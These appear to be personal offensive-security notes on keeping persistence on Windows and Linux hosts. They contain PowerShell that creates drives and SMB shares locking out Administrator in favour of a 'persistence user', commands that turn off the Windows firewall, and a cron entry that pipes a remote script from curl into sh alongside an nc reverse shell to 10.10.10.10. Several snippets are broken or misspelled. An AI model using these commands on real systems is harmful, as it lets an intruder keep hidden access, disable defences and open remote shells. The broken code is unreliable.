Smbmaze
```powershell
$persistenceUser = "User1"

for ($i=0; $i -lt 26; $i++) {
  $driveLetter = [char]($i + 65) + ":"
  if (!(Get-Volume | Where-Object DriveLetter -eq $driveLetter)) {
    $newDisk = New-VirtualDisk -DriveLetter $driveLetter -Size 10MB
    $acl = Get-Acl -Path $newDisk.DriveLetter
    $persistenceUserRights = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $persistenceUserAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($persistenceUser, $persistenceUserRights, "Allow")
    $acl.SetAccessRule($persistenceUserAccessRule)
    $otherUsersRights = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $otherUsersAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrator", $otherUsersRights, "Deny")
    $acl.SetAccessRule($otherUsersAccessRule)
    Set-Acl -Path $newDisk.DriveLetter -AclObject $acl
  }
}

```

Create a file share - the longer the path for copy and paste and shell nightmares
```powershell
#

# -ConcurrentUserLimit to prevent hacky breaking into destroy the share 

New-SmbShare -Name MyFileShare -Path $goodPath -FullAccess $persistenceUser -EncryptData $True -ConcurrentUserLimit 1 -ContinuouslyAvailable -Temporary
# You can set up an inital connection to a remote host with output from
#  New-CimSession Get-CimSession
-Cim-Session 


# Add to known adversary accounts -NoAccess Administrator

$Parameters = @{
    Name = '$Name'
    Path = $goodPath
    FullAccess = 'Contoso\Administrator', 'Contoso\Contoso-HV1$'
    EncryptData = $True
    Temporary = $True
    ContinuouslyAvailable = $True
    NoAccess = 'Administrator' # Prevent access administrator - create persistence user to access
}
New-SmbShare @Parameters
```



Firewall fun
```powershell
# Check Profile
netsh advfirewall show currentprofile

# Turn off the Firewall
NetSh Advfirewall set allprofiles state off

# Modify a Firewall Rule for a program
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
# Delete a rule
netsh.exe advfirewall firewall delete rule "<Rule Name>"_
```
[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)


```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```


- Cron Persistence updating, fixing, trick research
```bash

 crontab -e


CT=$(crontab -l)
CT=$CT('\n* * * * *   root    curl http://<ip>:<port>/run | sh')
' /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 10.10.10.10 6969 >/tmp/f'

printf "$CT" | cronbtab -
```

cron, setuid bash, alias

nobody account has bash

Systemd persistence
https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8